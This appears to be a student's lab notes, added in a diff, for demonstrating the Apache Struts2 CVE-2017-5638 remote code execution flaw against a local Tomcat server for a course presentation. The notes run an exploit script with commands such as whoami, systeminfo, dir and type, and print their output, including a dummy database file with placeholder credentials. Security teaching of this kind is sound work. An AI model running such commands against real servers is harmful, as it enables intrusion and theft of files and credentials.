@@ -1,0 +1,84 @@
+SETUP GUIDE HERE: https://medium.com/@lucideus/exploiting-apache-struts2-cve-2017-5638-lucideus-research-83adb9490ede
+All needed MSI/ZIP files are included in the folder
+
+
+
+cd C:\Users\LENOVO\Downloads\SC3010 Presentation\apache-tomcat-7.0.81-windows-x64\apache-tomcat-7.0.81\bin
+
+startup.bat  
+
+
+Go to http://localhost:8080/str/ in browser
+
+python str.py http://localhost:8080/str/ "whoami"
+python str.py http://localhost:8080/str/ "systeminfo"
+
+python str.py http://localhost:8080/str/ "dir"
+
+Shows (NOW YOU KNOW THE FILE PATHWAY!!!)
+
+/////////////////////////////////////////////////////////////
+Volume in drive C has no label.
+Volume Serial Number is 0C74-F665
+
+Directory of C:\Users\LENOVO\Downloads\SC3010 Presentation\apache-tomcat-7.0.81-windows-x64\apache-tomcat-7.0.81\bin
+
+03/27/2025  08:24 PM    <DIR>          .
+03/27/2025  08:24 PM    <DIR>          ..
+03/27/2025  07:19 PM            28,503 bootstrap.jar
+03/27/2025  07:19 PM             1,686 catalina-tasks.xml
+03/27/2025  07:19 PM            14,028 catalina.bat
+03/27/2025  07:19 PM            21,646 catalina.sh
+03/27/2025  07:19 PM           204,944 commons-daemon-native.tar.gz
+03/27/2025  07:19 PM            24,283 commons-daemon.jar
+03/27/2025  07:19 PM             2,040 configtest.bat
+03/27/2025  07:19 PM             1,922 configtest.sh
+03/27/2025  07:19 PM             7,888 daemon.sh
+03/27/2025  07:19 PM             2,091 digest.bat
+03/27/2025  07:19 PM             1,965 digest.sh
+03/27/2025  08:00 PM               453 fake_db.sql
+03/27/2025  07:19 PM             6,308 service.bat
+03/27/2025  07:19 PM             3,430 setclasspath.bat
+03/27/2025  07:19 PM             3,547 setclasspath.sh
+03/27/2025  07:19 PM             2,020 shutdown.bat
+03/27/2025  07:19 PM             1,902 shutdown.sh
+03/27/2025  07:19 PM             2,022 startup.bat
+03/27/2025  07:19 PM             1,904 startup.sh
+03/27/2025  07:42 PM             1,884 str.py
+03/27/2025  07:19 PM         2,107,392 tcnative-1.dll
+03/27/2025  07:19 PM            44,511 tomcat-juli.jar
+03/27/2025  07:19 PM           399,836 tomcat-native.tar.gz
+03/27/2025  07:19 PM           109,696 tomcat7.exe
+03/27/2025  07:19 PM           110,208 tomcat7w.exe
+03/27/2025  07:19 PM             4,021 tool-wrapper.bat
+03/27/2025  07:19 PM             5,024 tool-wrapper.sh
+03/27/2025  07:50 PM            30,448 velocity.log
+03/27/2025  07:19 PM             2,026 version.bat
+03/27/2025  07:19 PM             1,908 version.sh
+              30 File(s)      3,149,536 bytes
+               2 Dir(s)  11,416,993,792 bytes free
+/////////////////////////////////////////////////////////////
+
+python str.py http://localhost:8080/str/ "type fake_db.sql"
+
+/////////////////////////////////////////////////////////////
+-- fake_db.sql
+
+CREATE DATABASE IF NOT EXISTS fake_database;
+USE fake_database;
+
+CREATE TABLE IF NOT EXISTS users (
+    id INT AUTO_INCREMENT PRIMARY KEY,
+    username VARCHAR(50) NOT NULL,
+    password VARCHAR(255) NOT NULL,
+    email VARCHAR(100)
+);
+
+INSERT INTO users (username, password, email) VALUES
+('admin', 'password123', 'admin@example.com'),
+('user1', '123456', 'user1@example.com'),
+('user2', 'abcdef', 'user2@example.com');
+/////////////////////////////////////////////////////////////
+
+
+shutdown.bat 
